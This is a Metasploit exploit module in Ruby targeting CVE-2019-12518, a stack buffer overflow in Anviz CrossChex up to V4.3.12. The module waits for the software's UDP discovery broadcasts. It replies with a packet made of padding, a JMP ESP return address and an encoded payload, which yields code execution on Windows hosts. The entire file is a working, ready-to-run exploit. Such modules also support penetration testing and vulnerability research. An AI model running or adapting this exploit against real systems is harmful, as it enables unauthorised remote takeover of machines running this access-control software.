# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  PACKET_LEN = 10

  include Msf::Exploit::Remote::Udp

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Anviz CrossChex Buffer Overflow&#039;,
      &#039;Description&#039;	=> %q{
        Waits for broadcasts from Ainz CrossChex looking for new devices, and returns a custom broadcast,
        triggering a stack buffer overflow.
      },
      &#039;Author&#039;	  	=>
        [
            &#039;Luis Catarino <lcatarino@protonmail.com>&#039;,  # original discovery/exploit
            &#039;Pedro Rodrigues <pedrosousarodrigues@protonmail.com>&#039;,   # original discovery/exploit
            &#039;agalway-r7&#039;,  # Module creation
            &#039;adfoster-r7&#039; # Module creation
        ],
      &#039;License&#039;		  => MSF_LICENSE,
      &#039;References&#039;	=>
        [
            [&#039;CVE&#039;, &#039;2019-12518&#039;],
            [&#039;URL&#039;, &#039;https://www.0x90.zone/multiple/reverse/2019/11/28/Anviz-pwn.html&#039;],
            [&#039;EDB&#039;, &#039;47734&#039;]
        ],
      &#039;Payload&#039;        =>
        {
            &#039;Space&#039;    => 8947,
            &#039;DisableNops&#039; => true
        },
      &#039;Arch&#039; => ARCH_X86,
      &#039;EncoderType&#039; => Msf::Encoder::Type::Raw,
      &#039;Privileged&#039;	=> true,
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;DisclosureDate&#039; => &#039;2019-11-28&#039;,
      &#039;Targets&#039;        =>
          [
            [
              &#039;Crosschex Standard x86 <= V4.3.12&#039;,
              {
                  &#039;Offset&#039; => 261, # Overwrites memory to allow EIP to be overwritten
                  &#039;Ret&#039; => "\x07\x18\x42\x00", # Overwrites EIP with address of &#039;JMP ESP&#039; assembly command found in CrossChex data
                  &#039;Shift&#039; => 4 # Positions payload to be written at beginning of ESP
              }
            ]
          ],
      &#039;DefaultTarget&#039;  => 0
      ))
    deregister_udp_options
    register_options(
        [
            Opt::CPORT(5050, true, &#039;Port used to listen for CrossChex Broadcast.&#039;),
            Opt::CHOST("0.0.0.0", true, &#039;IP address that UDP Socket listens for CrossChex broadcast on. \&#039;0.0.0.0\&#039; is needed to receive broadcasts.&#039;),
            OptInt.new(&#039;TIMEOUT&#039;, [true, &#039;Time in seconds to wait for a CrossChex broadcast. 0 or less waits indefinitely.&#039;, 100])
        ])
  end

  def exploit
    connect_udp

    res, host, port = udp_sock.recvfrom(PACKET_LEN, datastore["TIMEOUT"].to_i > 0 ? (datastore["TIMEOUT"].to_i) : (nil))
    if res.empty?
      fail_with(Failure::TimeoutExpired, "Module timed out waiting for CrossChex broadcast")
    end

    print_status "CrossChex broadcast received, sending payload in response"
    sploit = rand_text_english(target[&#039;Offset&#039;])
    sploit << target.ret # Overwrites EIP with address of &#039;JMP ESP&#039; assembly command found in CrossChex data
    sploit << rand_text_english(target[&#039;Shift&#039;]) # Positions payload to be written at beginning of ESP
    sploit << payload.encoded

    udp_sock.sendto(sploit, host, port)
    print_status "Payload sent"
    end
end

